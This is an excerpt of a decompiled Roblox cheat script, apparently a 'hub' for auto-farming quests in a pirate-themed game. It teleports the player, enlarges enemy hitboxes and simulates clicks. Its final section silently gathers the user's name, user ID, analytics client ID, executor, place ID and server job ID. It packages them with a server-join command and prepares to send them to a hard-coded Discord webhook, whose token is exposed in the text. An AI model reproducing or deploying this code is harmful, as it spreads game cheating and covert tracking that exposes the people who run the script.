                                                                                                                                            ...
                                                                                                                                            if MyLevel < 2475 or MyLevel > 2524 then
                                                                                                                                                if MyLevel < 2525 or MyLevel > 2550 then
                                                                                                                                                    if (MyLevel < 2550 or MyLevel > 2574) and SelectMonster ~= 'Serpent Hunter' then
                                                                                                                                                        if (MyLevel < 2575 or MyLevel > 2599) and SelectMonster ~= 'Skull Slayer' then
                                                                                                                                                            if (MyLevel < 2600 or MyLevel > 2624) and SelectMonster ~= 'Reef Bandit' then
                                                                                                                                                                if (MyLevel < 2625 or MyLevel > 2649) and SelectMonster ~= 'Coral Pirate' then
                                                                                                                                                                    if (MyLevel < 2650 or MyLevel > 2674) and SelectMonster ~= 'Sea Chanter' then
                                                                                                                                                                        if MyLevel >= 2675 or SelectMonster == 'Ocean Prophet' then
                                                                                                                                                                            Mon = 'Ocean Prophet'
                                                                                                                                                                            LevelQuest = 2
                                                                                                                                                                            NameQuest = 'SubmergedQuest2'
                                                                                                                                                                            NameMon = 'Ocean Prophet'
                                                                                                                                                                            CFrameQuest = CFrame.new(10883.599, -2086.885, 10034.02)
                                                                                                                                                                    ...
                                                                                                                                                                    CFrameQuest = CFrame.new(10780.739, -2088.41, 9260.411)
                                                                                                                                                            ...
                                                                                                                                                            CFrameQuest = CFrame.new(-16665.19, 104.6, 1579.69)
...
Main:AddButton({
    Title = 'TrongNguyen Hub Script Discord',
    Callback = function()
        pcall(function()
        ...
        while true do
            ...
            if getgenv().AutoRipIndra and World3 then
                ...
                elseif _LocalPlayer22.Backpack:FindFirstChild("God's Chalice") or _LocalPlayer22.Character:FindFirstChild("God's Chalice") then
                    ...
                    until not _LocalPlayer22.Backpack:FindFirstChild("God's Chalice")

                    if _LocalPlayer22.Character:FindFirstChild("God's Chalice") then
                    end
                else
...
spawn(function()
    pcall(function()
        ...
        if not _Character24 then
        end
        if not _Quest2.Visible then
            local v1267 = Vector3.new(-11892.0703125, 930.57672119141, -8760.1591796875)

            if (v1267 - _Character24.Position).Magnitude <= 30 then
                task.wait(1.1)
                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('HornedMan', 'Bet')
            else
                topos(CFrame.new(v1267))
            end
        end
        ...
        local v1270, v1271, v1272 = pairs(v1269)
        ...
        while true do
            ...
            if string.find(_Text2, v1272) then
                local v1274 = game:GetService('Workspace').Enemies:FindFirstChild(v1272)

                if v1274 and v1274:FindFirstChild('HumanoidRootPart') then
                    local _CFrame8 = v1274.HumanoidRootPart.CFrame

                    task.wait()
                    AutoHaki()
                    EquipWeapon(getgenv().SelectWeapon)
                    topos(v1274.HumanoidRootPart.CFrame * Pos)

                    v1274.HumanoidRootPart.CanCollide = false
                    v1274.HumanoidRootPart.Size = Vector3.new(50, 50, 50)
                    v1274.HumanoidRootPart.CFrame = _CFrame8

                    game:GetService('VirtualUser'):CaptureController()
                    game:GetService('VirtualUser'):Button1Down(Vector2.new(1280, 672))

                    if not getgenv().AutoRainbowHaki or (v1274.Humanoid.Health <= 0 or not (v1274.Parent and _Quest2.Visible)) then
                    end
                end

                topos(CFrame.new(v1273))
                v1263()
            end
        end
    end)
...
game.StarterGui:SetCore('SendNotification', {
    ...
    Icon = 'rbxassetid://98660486972471',
    Duration = 100000,
    Button1 = 'Yes',
    Button2 = 'No',
})
...
_ImageLabel.Image = 'http://www.roblox.com/asset/?id=98660486972471'
...
local _LocalPlayer51 = _Players3.LocalPlayer
local _Folder = Instance.new('Folder')

_Folder.Name = 'Highlight_Folder'
_Folder.Parent = game.CoreGui;

(function(p1477)
    local _Highlight = Instance.new('Highlight')

    _Highlight.Name = p1477.Name
    _Highlight.FillColor = Color3.fromRGB(255, 255, 255)
    _Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    _Highlight.FillTransparency = 0.7
    _Highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    _Highlight.Parent = _Folder

    if p1477.Character then
        _Highlight.Adornee = p1477.Character
    end

    p1477.CharacterAdded:Connect(function(p1479)
        _Highlight.Adornee = p1479
    end)
end)(_LocalPlayer51)
_UserInputService.WindowFocused:Connect(function()
    _RunService5:Set3dRenderingEnabled(true)
end)
_UserInputService.WindowFocusReleased:Connect(function()
    _RunService5:Set3dRenderingEnabled(false)
end)
...
local _LocalPlayer52 = _Players4.LocalPlayer
local v1483 = game:GetService('RbxAnalyticsService'):GetClientId()
local v1484 = identifyexecutor()
local _PlaceId4 = game.PlaceId
local _JobId = game.JobId
local v1487 = {
    ['Content-Type'] = 'application/json',
}
local v1488 = _HttpService:JSONEncode({
    embeds = {
        {
            title = 'User Info :',
            url = 'https://www.roblox.com/users/' .. _LocalPlayer52.UserId,
            description = 'Name : **' .. _LocalPlayer52.DisplayName .. '**',
            color = tonumber('0x000000'),
            thumbnail = {
                url = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. _LocalPlayer52.UserId .. '&width=420&height=420&format=png',
            },
            fields = {
                {
                    name = 'Player Name:',
                    value = '`' .. _LocalPlayer52.Name .. '`',
                    inline = true,
                },
                {
                    name = 'User ID:',
                    value = '`' .. _LocalPlayer52.UserId .. '`',
                    inline = true,
                },
                {
                    name = 'Executor:',
                ...
                {
                    name = 'Script Hop:',
                    value = '```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(' .. _PlaceId4 .. ', "' .. _JobId .. '", game.Players.LocalPlayer)```',
                    inline = false,
                },
            },
        },
...
local v1489 = 'https://discord.com/api/webhooks/1489875404993990707/_gIGvZ5h1fXYIbH8w3G979Hfr-eJb1S1o1ACuXA9zZcWQhea9n741zf1mYlcLgknvYrA'
local v1490 = http_request or request or (HttpPost or syn.request)
